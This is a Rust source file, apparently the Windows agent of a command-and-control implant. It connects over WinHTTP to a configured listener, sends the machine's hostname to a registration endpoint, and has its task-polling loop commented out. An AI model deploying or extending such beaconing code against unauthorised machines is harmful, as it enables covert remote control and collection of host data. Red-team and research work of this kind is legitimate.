// References:
//  - https://github.com/Steve-xmh/alhc/blob/main/src/windows/mod.rs
//  - https://github.com/youyuanwu/winasio-rs/blob/c4bb4cd0d9bf7b0e944d2fd4b9487f2cfa7c4f9e/src/winhttp/mod.rs
use std::{
    ffi::c_void,
    sync::{Arc, Mutex},
    thread,
    time,
};
use windows::core::{Error, HSTRING, PCWSTR, w};

use crate::agents::RegisterAgent;
use crate::Config;
use crate::handlers::{
    async_handlers_windows::HRequestAsync,
    handlers_windows::{HConnect, HInternet, HRequest, HSession},
};
use crate::systeminfo::systeminfo_windows::{get_adapters_addresses, get_computer_name};

pub async fn run(config: Config) -> Result<(), Error> {
    let sleep = time::Duration::from_secs(config.sleep);

    let mut hsession = HSession::new()?;
    let mut hconnect = HConnect::new(
        &hsession,
        HSTRING::from(config.listener.host.to_string()),
        config.listener.port,
    )?;

    // Test request hello
    let response = match get(&mut hconnect, "/".to_string()).await {
        Ok(resp) => resp,
        Err(e) => {
            return Err(e);
        },
    };

    println!("{response}");

    thread::sleep(sleep);
    
    // Get agent info and register
    let hostname = match get_computer_name() {
        Ok(name) => name,
        Err(e) => "unknown".to_string(),
    };
    let listener_url = format!(
        "{}://{}:{}/",
        config.listener.proto.to_string(),
        config.listener.host.to_string(),
        config.listener.port.to_owned(),
    );

    let ra = RegisterAgent::new(hostname, listener_url);
    let ra_json = serde_json::to_string(&ra).unwrap();

    // Register agent
    let response = match post(&mut hconnect, "/reg".to_string(), ra_json.to_string()).await {
        Ok(resp) => resp,
        Err(e) => {
            return Err(e);
        }
    };
    println!("{response}");

    thread::sleep(sleep);

    // return Ok(());

    // loop {
    //     // TODO: Implement graceful shutdown.

    //     // Check task
    //     request(
    //         &mut state,
    //         config.listener.proto.to_string(),
    //         "/task".to_string(),
    //         "GET".to_string(),
    //         None,
    //     );

    //     thread::sleep(sleep);
    // }

    hconnect.h.close();
    hsession.h.close();

    Ok(())
}

async fn get(hconnect: &mut HConnect, url_path: String) -> Result<String, Error> {
    let mut hrequest = HRequest::new(
        hconnect,
        HSTRING::from("GET".to_string()),
        HSTRING::from(url_path.to_string()),
        None,
    )?;
    
    let result = hrequest.send_req(
        HSTRING::new(),
        0,
        0)?;
    let result = hrequest.recv_resp()?;

    let mut response = String::new();
    
    loop {
        let mut dw_size = 0;

        if let Err(e) = hrequest.query_data_available(Some(&mut dw_size)) {
            println!("Error querying data available: {e}");
        }

        if dw_size == 0 {
            break;
        }

        let mut buffer: Vec<u8> = vec![0; dw_size as usize];

        let r = hrequest.read_data(dw_size, &mut buffer);
        match r {
            Ok(_) => {
                response = response + String::from_utf8_lossy(&buffer).to_string().as_str();
            },
            Err(e) => println!("Error: {:?}", e),
        }

        if dw_size > 0 {
            break;
        }
    }

    hrequest.h.close();

    Ok(response)
}

async fn post(hconnect: &mut HConnect, url_path: String, data: String) -> Result<String, Error> {    
    let mut hrequest = HRequest::new(
        hconnect,
        HSTRING::from("POST".to_string()),
        HSTRING::from(url_path.to_string()),
        Some(vec![HSTRING::from("application/json")]),
    )?;

    let mut hreq_async = HRequestAsync::new(hrequest);

    let headers = HSTRING::from("Content-Type: application/json".to_string());

    hreq_async.async_send_req(headers, data.len() as u32).await?;
    hreq_async.async_write_data(
        data.as_bytes(),
        data.len() as u32
    ).await?;
    hreq_async.async_recv_resp().await?;

    let mut response = String::new();

    loop {
        let dw_size = hreq_async.async_query_data_available().await?;
        if dw_size == 0 {
            break;
        }

        for _ in 0..dw_size {
            let mut temp_buf = [0 as u8];
            let buf = temp_buf.as_mut_slice();
            let len_read = hreq_async
                .async_read_data(buf.len() as u32, buf).await?;
            assert!(buf.len() == len_read as usize);
            response.push(buf[0] as char);
        }
    }
    
    hreq_async.h.h.close();

    Ok(response)
}

fn close_handler(h: &mut HInternet) {
    h.close();
}